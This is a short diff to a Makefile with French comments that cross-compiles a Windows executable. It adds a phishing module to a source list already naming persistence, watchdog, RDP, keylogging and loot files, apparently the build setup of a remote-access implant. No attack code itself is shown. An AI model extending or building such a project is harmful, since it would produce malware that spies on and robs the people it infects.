@@ -11,8 +11,8 @@ CC = x86_64-w64-mingw32-gcc
 WINDRES = x86_64-w64-mingw32-windres
 
 # Fichiers source
-SOURCES = agent.c persistence.c watchdog.c rdp.c keylog.c loot.c
-HEADERS = persistence.h watchdog.h rdp.h keylog.h loot.h
+SOURCES = agent.c persistence.c watchdog.c rdp.c keylog.c loot.c phish.c
+HEADERS = persistence.h watchdog.h rdp.h keylog.h loot.h phish.h
 OBJECTS = $(SOURCES:.c=.o)
 
 # Nom de l'exécutable
